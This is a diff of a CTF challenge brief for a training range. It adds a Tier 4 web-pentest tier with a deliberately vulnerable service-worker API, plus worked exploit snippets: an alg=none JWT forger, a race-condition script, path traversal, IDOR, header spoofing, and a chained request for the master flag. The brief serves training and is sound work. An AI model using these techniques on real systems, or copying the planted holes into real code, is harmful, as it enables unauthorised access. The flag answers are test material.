@@ -1,30 +1,43 @@
-# CyberWorld Login -- Training-Range Brief (v3)
+# CyberWorld Login -- Training-Range Brief (v4)
 
-> **TRAINING ENVIRONMENT -- NO REAL CREDENTIALS.**
-> This range is a defensive-analyst CTF surface. It accepts any input
-> that passes its local validation, builds a fake session in
-> `window.sessionStorage`, and forwards you to a console + lab that
-> re-check that fake session. It never POSTs, never calls a backend,
-> and never reaches any third-party origin.
-> *Do not enter real usernames, passwords, emails, or recovery
-> identifiers.*
+> **FLLC Purple-Team OS · CyberWorld Training Range**
+> *"Hack the impossible. Defend the future."*
+> Provided as is for demonstration and educational purposes only. No
+> real credentials are accepted, transmitted, or stored.
+
+This range is a four-tier defensive + offensive analyst CTF. It
+accepts any input that passes its local validation, builds a fake
+session in `window.sessionStorage`, registers a deliberately
+vulnerable service-worker backend at `/CyberWorld_login/api/v1/*`,
+and forwards you to a console + lab + Burp-style workbench that
+re-check everything client-side. No POST ever leaves the origin.
+
+*Do not enter real usernames, passwords, emails, or recovery
+identifiers.* The login is bait so you can practise on it.
 
 | Surface | URL | Role |
 |---|---|---|
-| Entry | `index.html` | login (Findings F01-F10 observable here) |
-| Console | `console.html` | re-verifies session; Tier 1 rubric |
-| Lab | `lab.html` | hub linking the three tiers; aggregate progress |
+| Entry | `index.html` | login + Tier 1 audit surface (F01-F10) |
+| Console | `console.html` | independent session re-verifier; Tier 1 rubric |
+| Lab | `lab.html` | hub linking all four tiers; aggregate progress |
 | Crypto | `crypto.html` | Tier 2 cryptanalysis (F11-F15) |
 | Intel | `intel.html` | Tier 3 May-2026 threat intel (F16-F20) |
+| Intercept | `intercept.html` | Tier 4 Burp-style API workbench (F21-F30) |
+| SW backend | `sw-ctf.js` | service-worker fake server (Tier 4) |
 | Recovery | `recovery.html` | local-only training ticket |
 | Manifest | `manifest.json` | HMAC-SHA-256 signed; all fingerprints |
 | Brief | `CHALLENGE.md` | this document |
-| Robots | `robots.txt` | analyst breadcrumb |
+| Robots | `robots.txt` | analyst breadcrumb + decoy index |
 | Decoders | `../scripts/lsb_decode.py`, `../scripts/png_trailer_scan.py` | offline helpers |
 
-The CTF is small, self-contained, and meant to be solved with browser
-DevTools, `curl`, Python REPL, `pngcheck`, `exiftool`, and a calculator.
-The intended completion time is ~2 hours for a focused analyst.
+The range is solvable with browser DevTools, `curl` / `httpie`,
+Burp Suite (or `curl -H 'Authorization: Bearer ...'`), Python REPL,
+`pngcheck`, `exiftool`, and a calculator. Intended completion time
+is ~3 hours for a focused analyst.
+
+When the analyst closes all 30 findings, `localStorage.cw.role` is
+set to `operator` -- the main `/cyberworld.html` MMO consumes that
+grant to unlock operator-tier content for this browser.
 
 ---
 
@@ -93,10 +106,10 @@ result is the published `master_xor`. This is a linear code over
 **GF(2)<sup>32</sup>**:
 
 ```
-master_xor = T1 XOR T2 XOR ... XOR T20
+master_xor = T1 XOR T2 XOR ... XOR T30
 ```
 
-For the shipped manifest, `master_xor = 0xba1274e7`.
+For the shipped v4 manifest, `master_xor = 0xbc085f31` (30 findings across 4 tiers).
 
 ### Tier 1 -- Defensive Audit (F01-F10)
 
@@ -138,6 +151,45 @@ May-2026 vintage advisories + attribution + stego, on `intel.html`.
 | 18 | NIST SP 800-61 phase for "rotate exposed secrets + SHA-pin actions" | Eradication |
 | 19 | Mandiant tracker for Ivanti Connect Secure exploitation since Dec 2024 | UNC5337 |
 | 20 | Zero-width-space steganography in the intel brief | (flag from page) |
+
+### Tier 4 -- Burp-Style Web Pentest (F21-F30)
+
+A service worker at `sw-ctf.js` (scope `/CyberWorld_login/`) registers
+a small, deliberately vulnerable backend at `/api/v1/*`. The
+intercept workbench at `intercept.html` is your repeater. Real
+exploits and obvious false flags coexist on purpose -- this tier
+exists to train you to tell them apart.
+
+| # | Exploit | Where |
+|---|---|---|
+| 21 | Discover the service worker that proxies `/api/v1/*` | DevTools -> Application -> Service Workers |
+| 22 | Bypass JWT signature by using `alg: none` | GET `/api/v1/auth/whoami` with forged header |
+| 23 | Verify `cw_role` cookie is decoy (only JWT role enforced) | Flip cookie; `/admin/users` still 403s |
+| 24 | Forge JWT with `role: admin`, access `/api/v1/admin/users` | Authorization: Bearer hdr.payload. (alg=none) |
+| 25 | IDOR: GET `/api/v1/profile?uid=42` returns operator | Enumerate uid 1..50; flag at 42 |
+| 26 | Path traversal: GET `/api/v1/files?name=../etc/cyberworld.flag` | `../` is honored by the demo handler |
+| 27 | X-Forwarded-For: 127.0.0.1 bypasses `/api/v1/admin/geo` | Add header and re-send |
+| 28 | HPP: `?token=user&token=admin` returns admin (last wins) | `URLSearchParams.getAll` last value |
+| 29 | Race: 5+ parallel POSTs to `/api/v1/redeem` stack counter | Promise.all over 6 fetches |
+| 30 | Chain F22 + F24 + `X-Cw-Ops: cyberworld-operator` -> `/api/v1/internal/flag` | Master flag |
+
+#### Obvious false flags (training your decoy radar)
+
+These look exploitable. They are not. Notice them, log them, move on.
+
+* `./.env.bak` -- watermarked `DECOY__...`; response carries `X-CTF-Decoy: true`
+* `./.git/HEAD` -- points at `refs/heads/decoy-honeypot` (a real repo's HEAD references `main`/`master`)
+* `./backup.zip` -- a `PK\x03\x04` header followed by junk; `unzip` fails
+* `./admin.php`, `./wp-admin/` -- no PHP, no WordPress on a static site
+* `./config.json` -- `api_key=DECOY...`, `jwt_secret=DECOY...`
+* `GET /api/v1/debug?secret=admin` -- returns "thanks for trying"; `X-CTF-Decoy: true`
+* `GET /api/v1/lab/sysinfo` -- lies about a server fingerprint that doesn't exist
+* `GET /api/v1/__proto__/polluted` -- there is no prototype-pollution sink
+* `<noscript><form action="/cgi-bin/cyberworld-login.cgi">` -- static host, no CGI
+* `<div hidden data-fake-flag="CTF_FLAG{F00_decoy_only_real_flags_start_at_F21}">`
+* HTML comment `CYBERWORLD_JWT_SECRET=DECOY__see_alg_none_F22`
+* `REVDT1lfRjAwX25vdF9hX2ZsYWc=` (base64) -> `DECOY_F00_not_a_flag`
+* Cookies `cw_admin_token`, `cw_csrf` -- backend never reads them
 
 ---
 
@@ -354,6 +406,79 @@ A production page should host the bootstrap externally and drop
     (Vigenere repeated-trigram method).
 17. W. F. Friedman, *The Index of Coincidence and its Applications in
     Cryptography*, 1922.
+
+---
+
+## §G · Tier-4 Endpoint Catalog (`sw-ctf.js`)
+
+The service-worker registers with scope `/CyberWorld_login/` and
+intercepts every same-origin fetch. Endpoints under `/api/v1/` are
+deliberately vulnerable; the rest is the real static surface.
+
+| Method | Path | Behaviour |
+|---|---|---|
+| GET | `/api/v1/debug/echo` | Reflects method + URL + headers + query; recon tool |
+| GET | `/api/v1/auth/issue?sub=X&role=Y` | Mints HS256 JWT signed with weak key `cyberworld` |
+| GET | `/api/v1/auth/whoami` | Decodes Bearer JWT; `alg=none` accepted (F22) |
+| GET | `/api/v1/profile?uid=N` | IDOR; uid=42 is the operator profile (F25) |
+| GET | `/api/v1/admin/users` | Requires Bearer JWT `role=admin` (F24) |
+| GET | `/api/v1/admin/geo` | Requires `X-Forwarded-For: 127.0.0.1` (F27) |
+| GET | `/api/v1/files?name=X` | Path-traversal demo; `../etc/cyberworld.flag` wins (F26) |
+| GET | `/api/v1/hpp?token=X&token=Y` | HPP last-write-wins (F28) |
+| POST | `/api/v1/redeem` | Process-wide counter races past 5 (F29) |
+| GET | `/api/v1/internal/flag` | Chain F22 + F24 + `X-Cw-Ops: cyberworld-operator` (F30) |
+
+Decoy endpoints / files (each carries `X-CTF-Decoy: true` or is otherwise marked):
+
+* `/api/v1/debug?secret=admin`
+* `/api/v1/lab/sysinfo`
+* `/api/v1/__proto__/polluted`
+* `/CyberWorld_login/.env.bak`
+* `/CyberWorld_login/.git/HEAD`
+* `/CyberWorld_login/backup.zip`
+* `/CyberWorld_login/config.json`
+* `/CyberWorld_login/admin.php`
+* `/CyberWorld_login/wp-admin/`
+
+### G.1 · Forging an `alg=none` JWT by hand
+
+```python
+import base64, json
+def b64u(b):
+    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+hdr = b64u(json.dumps({"alg":"none","typ":"JWT"}).encode())
+pl  = b64u(json.dumps({"sub":"forged-operator","role":"admin","iat":1779852000,"exp":1779938400}).encode())
+print(hdr + "." + pl + ".")
+```
+
+Send the result as `Authorization: Bearer <hdr>.<pl>.` (note the
+trailing dot -- the signature segment is intentionally empty).
+
+### G.2 · Race-condition exploitation
+
+```js
+await Promise.all(
+  Array.from({length:6}, () =>
+    fetch("api/v1/redeem", { method: "POST" })
+      .then(r => r.json()))
+);
+```
+
+The counter is process-wide in the service worker and is not
+guarded; six parallel POSTs race past the `REDEEM_THRESHOLD=5`
+gate. `intercept.html`'s "Race 6x POST /redeem" button does this
+for you.
+
+### G.3 · Chaining for the master flag (F30)
+
+```http
+GET /CyberWorld_login/api/v1/internal/flag HTTP/1.1
+Authorization: Bearer <alg=none header>.<role=admin payload>.
+X-Cw-Ops: cyberworld-operator
+```
+
+Response includes `master_flag: CTF_FLAG{F30_...}` and `cyberworld_grant: operator`,
+which triggers the MMO handoff: `localStorage.cw.role = 'operator'`.
 
 ---
 
